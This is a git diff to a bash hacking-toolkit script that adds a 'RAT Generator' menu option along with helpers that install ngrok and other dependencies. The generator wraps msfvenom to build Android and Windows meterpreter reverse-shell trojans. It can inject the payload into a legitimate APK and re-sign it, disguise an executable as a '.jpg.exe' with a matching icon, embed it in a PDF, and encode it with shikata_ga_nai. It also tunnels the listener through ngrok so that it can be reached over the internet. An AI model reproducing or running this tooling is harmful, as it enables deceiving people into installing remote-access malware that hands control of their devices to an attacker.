@@ -14,6 +14,72 @@ show_banner() {
     echo -e "\033[1;33m=====================================\033[0m"
 }
 
+# Helper function to check for and install dependencies
+install_dependency() {
+    local cmd=$1
+    local package=$2
+    if ! command -v "$cmd" &> /dev/null; then
+        echo -e "\033[1;33m[!] '$cmd' is not found.\033[0m"
+        echo -n -e "\033[1;34mWould you like to try and install it now using 'sudo apt-get install $package'? (y/n): \033[0m"
+        read -r install_confirm
+        if [[ "$install_confirm" == "y" || "$install_confirm" == "Y" ]]; then
+            echo -e "\033[1;33m[*] Attempting to install '$package'...\033[0m"
+            sudo apt-get update && sudo apt-get install -y "$package"
+            if ! command -v "$cmd" &> /dev/null; then
+                echo -e "\033[1;31m[✗] Installation failed. Please install '$package' manually.\033[0m"
+                return 1
+            else
+                echo -e "\033[1;32m[✓] '$package' installed successfully.\033[0m"
+            fi
+        else
+            echo -e "\033[1;31m[✗] Installation skipped. The feature requiring '$cmd' may not work.\033[0m"
+            return 1
+        fi
+    fi
+    return 0
+}
+
+# Helper function to install ngrok
+install_ngrok() {
+    if ! command -v "ngrok" &> /dev/null; then
+        echo -e "\033[1;33m[!] 'ngrok' is not found.\033[0m"
+        echo -n -e "\033[1;34mWould you like to try and download and install it now? (y/n): \033[0m"
+        read -r install_confirm
+        if [[ "$install_confirm" == "y" || "$install_confirm" == "Y" ]]; then
+            echo -e "\033[1;33m[*] Detecting architecture and downloading ngrok...\033[0m"
+            local arch
+            arch=$(uname -m)
+            local ngrok_url=""
+            case "$arch" in
+                x86_64) ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip" ;;
+                armv7l) ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip" ;;
+                aarch64) ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip" ;;
+                *) echo -e "\033[1;31m[✗] Unsupported architecture: $arch. Please install ngrok manually.\033[0m"; return 1 ;;
+            esac
+
+            wget -q "$ngrok_url" -O /tmp/ngrok.zip
+            if [[ $? -ne 0 ]]; then echo -e "\033[1;31m[✗] Download failed. Please install ngrok manually.\033[0m"; return 1; fi
+
+            unzip -o /tmp/ngrok.zip -d /tmp
+            echo -e "\033[1;33m[*] Installing ngrok to /usr/local/bin...\033[0m"
+            sudo mv /tmp/ngrok /usr/local/bin/
+            rm /tmp/ngrok.zip
+
+            if ! command -v "ngrok" &> /dev/null; then
+                echo -e "\033[1;31m[✗] Installation failed. Please check permissions and install ngrok manually.\033[0m"
+                return 1
+            else
+                echo -e "\033[1;32m[✓] ngrok installed successfully.\033[0m"
+                echo -e "\033[1;33m[!] IMPORTANT: You may need to configure your ngrok authtoken. See ngrok's documentation.\033[0m"
+            fi
+        else
+            echo -e "\033[1;31m[✗] Installation skipped. The feature requiring 'ngrok' may not work.\033[0m"
+            return 1
+        fi
+    fi
+    return 0
+}
+
 # Modified function to display the main menu with VPN option
 show_menu() {
     echo -e "\033[1;32m[*] Choose an option:\033[0m"
@@ -27,6 +93,7 @@ show_menu() {
     echo -e "\033[1;36m8)\033[0m \033[1;32mOSINT Tools\033[0m"
     echo -e "\033[1;36m9)\033[0m \033[1;32mRun Bettercap\033[0m"
     echo -e "\033[1;36m10)\033[0m \033[1;32mOpenVPN Manager\033[0m"
+    echo -e "\033[1;36m11)\033[0m \033[1;32mRAT Generator\033[0m"
     echo -e "\033[1;36m69)\033[0m \033[1;31mExit\033[0m"
     echo -e "\033[1;33m=====================================\033[0m"
     echo -n "Please choose an option: "
@@ -1849,6 +1916,251 @@ EOF
     fi
 }
 
+# Function to generate RAT payloads
+run_rat_generator() {
+    clear
+    figlet -f slant "RAT Gen" | lolcat
+    echo -e "\n\033[1;34m=====================================\033[0m"
+    echo -e "\033[1;33m        Remote Access Trojan Gen         \033[0m"
+    echo -e "\033[1;34m=====================================\033[0m\n"
+
+    # Check if msfvenom is installed
+    if ! command -v msfvenom &> /dev/null; then
+        echo -e "\033[1;31m[✗] msfvenom is not installed. This feature requires the Metasploit Framework.\033[0m"
+        echo -e "\033[1;33m[*] To install it on a Debian-based system, you can run:\033[0m"
+        echo -e "\033[1;32mcurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall\033[0m"
+        echo -e "\n\033[1;33mPress Enter to return to the main menu...\033[0m"
+        read
+        return
+    fi
+
+    echo -e "\033[1;34mSelect RAT Type:\033[0m"
+    echo -e "\033[1;36m1)\033[0m \033[1;32mAndroid\033[0m"
+    echo -e "\033[1;36m2)\033[0m \033[1;32mWindows\033[0m"
+    echo -e "\033[1;36m0)\033[0m \033[1;32mBack to Main Menu\033[0m"
+
+    echo -n -e "\n\033[1;34mEnter your choice: \033[0m"
+    read rat_choice
+
+    local payload_type=""
+    local output_file_extension=""
+    local format_choice=1 # Default to EXE for Windows
+    local android_mode="standalone" # Default for Android
+
+    case $rat_choice in
+        0) return ;;
+        1)
+            payload_type="android/meterpreter/reverse_tcp"
+            echo -e "\n\033[1;34mSelect Android Payload Type:\033[0m"
+            echo -e "\033[1;36m1)\033[0m \033[1;32mGenerate Standalone APK\033[0m"
+            echo -e "\033[1;36m2)\033[0m \033[1;32mInject into Existing APK\033[0m"
+            echo -n -e "\n\033[1;34mEnter your choice: \033[0m"
+            read android_choice
+
+            if [[ "$android_choice" == "1" ]]; then
+                android_mode="standalone"
+                output_file_extension="apk"
+            elif [[ "$android_choice" == "2" ]]; then
+                android_mode="inject"
+                output_file_extension="apk"
+            else
+                echo -e "\033[1;31mInvalid choice! Returning.\033[0m"; sleep 2; return
+            fi
+            ;;
+        2)
+            payload_type="windows/meterpreter/reverse_tcp"
+            echo -e "\n\033[1;34mSelect Windows Payload Format:\033[0m"
+            echo -e "\033[1;36m1)\033[0m \033[1;32mStandalone Executable (.exe)\033[0m"
+            echo -e "\033[1;36m2)\033[0m \033[1;32mPDF with Embedded Executable (.pdf)\033[0m"
+            echo -e "\033[1;36m3)\033[0m \033[1;32mDisguised Executable (e.g., .jpg.exe)\033[0m"
+            echo -n -e "\n\033[1;34mEnter your choice: \033[0m"
+            read format_choice
+
+            if [[ "$format_choice" == "1" ]]; then
+                output_file_extension="exe"
+            elif [[ "$format_choice" == "2" ]]; then
+                output_file_extension="pdf"
+            elif [[ "$format_choice" == "3" ]]; then
+                echo -e "\n\033[1;34mEnter the full disguised extension (e.g., jpg.exe, scr):\033[0m "
+                read disguised_ext
+                if [[ -z "$disguised_ext" ]]; then echo -e "\033[1;31mExtension cannot be empty! Aborting.\033[0m"; sleep 2; return; fi
+                output_file_extension="$disguised_ext"
+            else
+                echo -e "\033[1;31mInvalid format choice! Returning to main menu.\033[0m"; sleep 2; return
+            fi
+            ;;
+        *)
+            echo -e "\033[1;31mInvalid choice! Returning to the main menu.\033[0m"
+            sleep 2
+            return
+            ;;
+    esac
+
+    local lhost=""
+    local lport=""
+    local listener_lhost="0.0.0.0" # Default listener host
+    local listener_lport=""
+
+    echo -e "\n\033[1;34mUse ngrok for WAN access (e.g., over the internet)? (y/n)\033[0m"
+    read use_ngrok
+
+    if [[ "$use_ngrok" == "y" || "$use_ngrok" == "Y" ]]; then
+        install_ngrok || return
+        install_dependency "curl" "curl" || return
+
+        echo -e "\n\033[1;34mEnter the local port you want to forward (e.g., 4444):\033[0m "
+        read local_port
+        if ! [[ "$local_port" =~ ^[0-9]+$ ]]; then echo -e "\033[1;31mInvalid port! Aborting.\033[0m"; sleep 2; return; fi
+        listener_lport=$local_port
+
+        echo -e "\033[1;33m[*] Killing any existing ngrok processes...\033[0m"
+        killall ngrok &>/dev/null
+
+        echo -e "\033[1;33m[*] Starting ngrok in the background...\033[0m"
+        ngrok tcp "$local_port" > /dev/null &
+        sleep 5
+
+        ngrok_url_full=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"tcp://[^"]*' | cut -d '"' -f 4)
+        if [[ -z "$ngrok_url_full" ]]; then
+            echo -e "\033[1;31m[✗] Could not get public URL from ngrok. Is it running correctly?\033[0m"
+            killall ngrok &>/dev/null; read; return
+        fi
+
+        lhost=$(echo "$ngrok_url_full" | cut -d ':' -f 2 | sed 's/\/\///')
+        lport=$(echo "$ngrok_url_full" | cut -d ':' -f 3)
+        echo -e "\033[1;32m[✓] ngrok is forwarding: $lhost:$lport -> 127.0.0.1:$local_port\033[0m"
+
+    else
+        echo -e "\n\033[1;34mEnter Listener IP (LHOST):\033[0m "
+        read lhost
+        if [[ -z "$lhost" ]]; then echo -e "\033[1;31mListener IP is required!\033[0m"; sleep 2; return; fi
+
+        echo -e "\n\033[1;34mEnter Listener Port (LPORT):\033[0m "
+        read lport
+        if [[ -z "$lport" ]]; then echo -e "\033[1;31mListener Port is required!\033[0m"; sleep 2; return; fi
+        listener_lport=$lport
+        listener_lhost=$lhost
+    fi
+
+    echo -e "\n\033[1;34mEnter output file name (without extension):\033[0m "
+    read output_file_name
+    if [[ -z "$output_file_name" ]]; then
+        output_file_name="payload_$(date +%Y%m%d_%H%M%S)"
+    fi
+
+    # Create results directory if it doesn't exist
+    mkdir -p results
+    local output_path=""
+
+    # --- Android Standalone APK Generation ---
+    if [[ "$rat_choice" == "1" && "$android_mode" == "standalone" ]]; then
+        output_path="results/$output_file_name.$output_file_extension"
+        echo -e "\n\033[1;33m[*] Generating Standalone APK payload...\033[0m"
+        msfvenom -p $payload_type LHOST=$lhost LPORT=$lport -o "$output_path"
+
+    # --- Android APK Injection ---
+    elif [[ "$rat_choice" == "1" && "$android_mode" == "inject" ]]; then
+        install_dependency "apktool" "apktool" || return
+        install_dependency "keytool" "default-jre" || return
+        install_dependency "jarsigner" "default-jre" || return
+
+        echo -e "\n\033[1;34mEnter the full path to the legitimate APK to inject into:\033[0m "
+        read template_apk
+        if [[ ! -f "$template_apk" ]]; then
+            echo -e "\033[1;31m[✗] File not found: $template_apk\033[0m"; read; return
+        fi
+
+        output_path="results/$output_file_name.apk"
+        local keystore="results/temp_keystore.keystore"
+
+        echo -e "\n\033[1;33m[*] Generating and injecting payload into '$template_apk'...\033[0m"
+        echo -e "\033[1;33mThis may take a few moments...\033[0m"
+        msfvenom -p $payload_type LHOST=$lhost LPORT=$lport -x "$template_apk" -o "$output_path"
+        if [[ $? -ne 0 ]]; then
+            echo -e "\n\033[1;31m[✗] msfvenom failed. The template APK might be incompatible or protected.\033[0m"
+            rm -f "$output_path"; read; return
+        fi
+
+        echo -e "\033[1;33m[*] Generating a temporary signing key...\033[0m"
+        keytool -genkey -v -keystore "$keystore" -alias mykey -keyalg RSA -keysize 2048 -validity 10000 -storepass password123 -keypass password123 -dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=UN" &>/dev/null
+
+        echo -e "\033[1;33m[*] Signing the new APK with jarsigner...\033[0m"
+        jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore "$keystore" -storepass password123 "$output_path" mykey &>/dev/null
+        rm -f "$keystore"
+
+    # --- Windows EXE / Disguised EXE Generation ---
+    elif [[ "$rat_choice" == "2" && ("$format_choice" == "1" || "$format_choice" == "3") ]]; then
+        local msfvenom_cmd="msfvenom -p $payload_type LHOST=$lhost LPORT=$lport"
+        echo -e "\n\033[1;34mWould you like to add encoding to the payload? (y/n)\033[0m"
+        read add_encoding
+        if [[ "$add_encoding" == "y" || "$add_encoding" == "Y" ]]; then
+            echo -e "\n\033[1;34mEnter the number of encoding iterations (e.g., 5-10):\033[0m "
+            read iterations
+            if [[ "$iterations" =~ ^[0-9]+$ ]]; then
+                msfvenom_cmd="$msfvenom_cmd -e x86/shikata_ga_nai -i $iterations"
+            fi
+        fi
+
+        output_path="results/$output_file_name.$output_file_extension"
+        echo -e "\n\033[1;33m[*] Generating Executable payload...\033[0m"
+        eval "$msfvenom_cmd -o $output_path"
+
+        if [[ "$format_choice" == "3" ]]; then
+            echo -e "\n\033[1;33m[!] Note: For best results, manually change the file icon on a Windows machine to match the fake file type (e.g., a picture icon for a .jpg.exe file).\033[0m"
+        fi
+
+    # --- Windows PDF Generation ---
+    elif [[ "$rat_choice" == "2" && "$format_choice" == "2" ]]; then
+        if ! command -v msfconsole &> /dev/null; then
+            echo -e "\033[1;31m[✗] msfconsole is not installed. This feature requires the Metasploit Framework.\033[0m"
+            echo -e "\033[1;33m[*] To install it on a Debian-based system, you can run:\033[0m"
+            echo -e "\033[1;32mcurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall\033[0m"
+            read; return
+        fi
+
+        local temp_exe="/tmp/$output_file_name.exe"
+        local resource_script="/tmp/pdf_resource.rc"
+
+        echo -e "\n\033[1;33m[*] Generating temporary EXE payload...\033[0m"
+        eval "msfvenom -p $payload_type LHOST=$lhost LPORT=$lport -o $temp_exe"
+
+        if [[ $? -ne 0 ]]; then echo -e "\n\033[1;31m[✗] Failed to generate temp EXE.\033[0m"; rm -f "$temp_exe"; read; return; fi
+
+        echo -e "\033[1;33m[*] Creating resource script for PDF embedding...\033[0m"
+        echo "use exploit/windows/fileformat/adobe_pdf_embedded_exe" > "$resource_script"
+        echo "set INFILENAME $temp_exe" >> "$resource_script"
+        echo "set FILENAME $output_file_name.pdf" >> "$resource_script"
+        echo "exploit" >> "$resource_script"
+        echo "exit" >> "$resource_script"
+
+        echo -e "\033[1;33m[*] Running msfconsole to embed the EXE into a PDF...\033[0m"
+        msfconsole -q -r "$resource_script"
+
+        if [[ -f "$HOME/.msf4/local/$output_file_name.pdf" ]]; then
+            mv "$HOME/.msf4/local/$output_file_name.pdf" "results/"
+            output_path="results/$output_file_name.pdf"
+        else
+            echo -e "\n\033[1;31m[✗] Failed to find the generated PDF.\033[0m"; rm -f "$temp_exe" "$resource_script"; read; return
+        fi
+        rm -f "$temp_exe" "$resource_script"
+    fi
+
+    if [[ -f "$output_path" ]]; then
+        echo -e "\n\033[1;32m[✓] Payload generated successfully!\033[0m"
+        echo -e "\033[1;32m[✓] Saved to: $output_path\033[0m"
+        echo -e "\n\033[1;34mTo start a listener in msfconsole:\033[0m"
+        echo -e "\033[1;33mmsfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $payload_type; set LHOST $listener_lhost; set LPORT $listener_lport; run'\033[0m"
+        if [[ "$use_ngrok" == "y" || "$use_ngrok" == "Y" ]]; then
+            echo -e "\n\033[1;33m[!] IMPORTANT: ngrok is running in the background. Stop it with 'killall ngrok' when you are finished.\033[0m"
+        fi
+    else
+        echo -e "\n\033[1;31m[✗] Failed to generate payload.\033[0m"
+    fi
+
+    echo -e "\n\033[1;33mPress Enter to return to the main menu...\033[0m"
+    read
+}
+
 # Function to manage OpenVPN connection
 run_openvpn() {
     # Create config directory if it doesn't exist
@@ -2016,6 +2328,9 @@ main() {
                 ;;
             10)
                 run_openvpn
+                ;;
+            11)
+                run_rat_generator
                 ;;
             69)
                 echo -e "\033[1;32m[*] Thank you for using Psatool-420!\033[0m"
